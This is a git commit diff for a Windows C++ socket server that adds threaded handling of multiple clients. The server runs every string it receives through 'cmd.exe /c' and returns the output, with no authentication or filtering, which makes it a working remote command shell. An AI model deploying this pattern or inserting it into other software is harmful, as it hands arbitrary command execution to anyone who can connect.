f79b0f0261b8d454ad1c3351bd02271ebf92adf9
Prakash Mahara <64721258+prakash27x@users.noreply.github.com>
2025-07-02 13:05:26 +0545

    multiple client handling setup

--- server.cpp
+++ server.cpp
@@ -6,23 +6,74 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <iostream>
+#include <string>
+#include <thread>
 #include <cstdio>
 
 #pragma comment(lib, "Ws2_32.lib")
 
+void handleClient(SOCKET clientSocket) {
+    char recvBuffer[BUFFER_SIZE];
+
+    std::cout << "[+] Client connected. Handling in new thread.\n";
+
+    while (true) {
+        ZeroMemory(recvBuffer, BUFFER_SIZE);
+        int bytesReceived = recv(clientSocket, recvBuffer, BUFFER_SIZE - 1, 0);
+        if (bytesReceived <= 0) {
+            std::cout << "[-] Client disconnected.\n";
+            break;
+        }
+
+        recvBuffer[bytesReceived] = '\0';
+        std::cout << "[*] Command received: " << recvBuffer << "\n";
+
+        if (strcmp(recvBuffer, "exit") == 0) {
+            std::cout << "[*] Client requested exit.\n";
+            break;
+        }
+
+        std::string command = "cmd.exe /c ";
+        command += recvBuffer;
+
+        FILE* pipe = _popen(command.c_str(), "r");
+        if (!pipe) {
+            const char* errorMsg = "Failed to execute command.\n";
+            send(clientSocket, errorMsg, strlen(errorMsg), 0);
+            continue;
+        }
+
+        char outputBuffer[BUFFER_SIZE];
+        std::string allOutput;
+        while (fgets(outputBuffer, BUFFER_SIZE, pipe)) {
+            allOutput += outputBuffer;
+        }
+        _pclose(pipe);
+
+        if (allOutput.empty()) {
+            allOutput = "Command executed, but no output returned (or invalid command).\n";
+        }
+
+        send(clientSocket, allOutput.c_str(), allOutput.size(), 0);
+    }
+
+    closesocket(clientSocket);
+    std::cout << "[*] Closed client connection.\n";
+}
+
 int main() {
     WSADATA wsaData;
-    SOCKET listeningSocket, clientSocket;
+    SOCKET listeningSocket;
     sockaddr_in serverAddr;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        std::cerr << "WSAStartup failed.\n";
+        std::cerr << "[-] WSAStartup failed.\n";
         return 1;
     }
 
     listeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (listeningSocket == INVALID_SOCKET) {
-        std::cerr << "Socket creation failed.\n";
+        std::cerr << "[-] Socket creation failed.\n";
         WSACleanup();
         return 1;
     }
@@ -32,73 +83,30 @@ int main() {
     serverAddr.sin_port = htons(PORT);
 
     if (bind(listeningSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "Bind failed.\n";
+        std::cerr << "[-] Bind failed.\n";
         closesocket(listeningSocket);
         WSACleanup();
         return 1;
     }
 
     if (listen(listeningSocket, SOMAXCONN) == SOCKET_ERROR) {
-        std::cerr << "Listen failed.\n";
+        std::cerr << "[-] Listen failed.\n";
         closesocket(listeningSocket);
         WSACleanup();
         return 1;
     }
 
-    std::cout << "Server listening on port 5500...\n";
+    std::cout << "[+] Server listening on port " << PORT << "...\n";
 
     while (true) {
-        clientSocket = accept(listeningSocket, nullptr, nullptr);
+        SOCKET clientSocket = accept(listeningSocket, nullptr, nullptr);
         if (clientSocket == INVALID_SOCKET) {
-            std::cerr << "Accept failed.\n";
+            std::cerr << "[-] Accept failed.\n";
             continue;
         }
 
-        std::cout << "\nClient connected.\n";
-
-        char recvBuffer[BUFFER_SIZE];
-        while (true) {
-            ZeroMemory(recvBuffer, BUFFER_SIZE);
-            int bytesReceived = recv(clientSocket, recvBuffer, BUFFER_SIZE - 1, 0);
-            if (bytesReceived <= 0) {
-                std::cout << "Client disconnected.\n";
-                break;
-            }
-
-            recvBuffer[bytesReceived] = '\0';
-            std::cout << "Command received: " << recvBuffer << "\n";
-
-            if (strcmp(recvBuffer, "exit") == 0) {
-                std::cout << "Client requested exit.\n";
-                break;
-            }
-
-            std::string command = "cmd.exe /c ";
-            command += recvBuffer;
-            
-            FILE* pipe = _popen(command.c_str(), "r");   //added
-            if (!pipe) {
-                const char* errorMsg = "Failed to execute command.\n";
-                send(clientSocket, errorMsg, strlen(errorMsg), 0);
-                continue;
-            }
-
-            char outputBuffer[BUFFER_SIZE];
-            std::string allOutput;
-            while (fgets(outputBuffer, BUFFER_SIZE, pipe)) {
-                allOutput += outputBuffer;
-            }
-            _pclose(pipe);
-
-            if (allOutput.empty()) {
-                allOutput = "Command executed, but no output returned (or invalid command).\n";
-            }
-
-            send(clientSocket, allOutput.c_str(), allOutput.size(), 0);
-        }
-
-        closesocket(clientSocket);
-        std::cout << "Waiting for next client...\n";
+        std::thread clientThread(handleClient, clientSocket);
+        clientThread.detach();  // Let the thread run independently
     }
 
     closesocket(listeningSocket);
